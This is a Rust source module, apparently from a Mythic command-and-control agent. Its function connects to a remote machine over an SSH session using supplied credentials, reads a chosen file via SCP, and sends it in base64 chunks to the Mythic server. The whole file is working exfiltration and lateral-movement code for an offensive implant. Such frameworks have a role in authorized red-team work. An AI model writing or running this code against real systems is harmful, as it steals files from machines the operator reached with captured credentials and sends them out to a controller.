use serde_json::json;

use crate::agent::{AgentTask, ContinuedData};
use crate::mythic_success;

use ssh2::Session;
use std::error::Error;
use std::io::{Cursor, Read};
use std::path::Path;
use std::result::Result;
use std::sync::mpsc;

use super::SshArgs;

/// Chunk size used for file transfer
const CHUNK_SIZE: usize = 512000;

/// Function used to download a file from a machine with SCP and upload it to Mythic
/// * `sess` - Connected SSH session
/// * `task` - Task used to invoke the command
/// * `args` - Task arguments
/// * `tx` - Channel for sending data to Mythic
/// * `rx` - Channel for receiving data from Mythic
pub fn download_file(
    sess: Session,
    task: &AgentTask,
    args: &SshArgs,
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<serde_json::Value, Box<dyn Error>> {
    // Get the path from the arguments
    let file_path = args.download.as_ref().unwrap();

    // Create a new SCP session for receiving a file
    let (mut f_recv, f_stat) = sess.scp_recv(Path::new(&file_path))?;

    // Check if trying to access a directory
    if f_stat.is_dir() {
        return Err("Remote path is not a file".into());
    }

    // Read the file from the machine
    let mut file_data: Vec<u8> = Vec::new();
    f_recv.read_to_end(&mut file_data)?;
    let file_len = file_data.len();

    // Get the number of chunks for the file transfer
    let total_chunks = ((file_len as f64 / CHUNK_SIZE as f64).ceil()) as usize;

    // Initialize the upload procedure to Mythic
    tx.send(json!({
        "total_chunks": total_chunks,
        "task_id": task.id,
        "full_path": &file_path,
        "host": args.host,
        "is_screenshot": false,
    }))?;

    let mut c = Cursor::new(file_data);

    // Grab the file id for tracking
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let params: ContinuedData = serde_json::from_str(&task.parameters)?;
    let file_id = params
        .file_id
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::Other, "No file id"))?;

    // Continue sending chunks of the file to Mythic
    for num in 0..total_chunks {
        let mut buffer: [u8; CHUNK_SIZE] = [0; CHUNK_SIZE];
        let len = c.read(&mut buffer)?;

        let chunk_data = base64::encode(&buffer[..len]);

        tx.send(json!({
            "chunk_num": num + 1,
            "file_id": file_id,
            "chunk_data": chunk_data,
            "task_id": task.id,
            "total_chunks": -1,
        }))?;

        let _: AgentTask = serde_json::from_value(rx.recv()?)?;
    }

    // Notify Mythic that the transfer was a success
    let mut output = mythic_success!(task.id, file_id);
    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!(
            [
                {
                    "base_artifact": "Remote FileOpen",
                    "artifact": format!("ssh {}@{} -download {}", args.credentials.account, args.host, file_path),
                }
            ]
        )
    );

    Ok(serde_json::to_value(output)?)
}
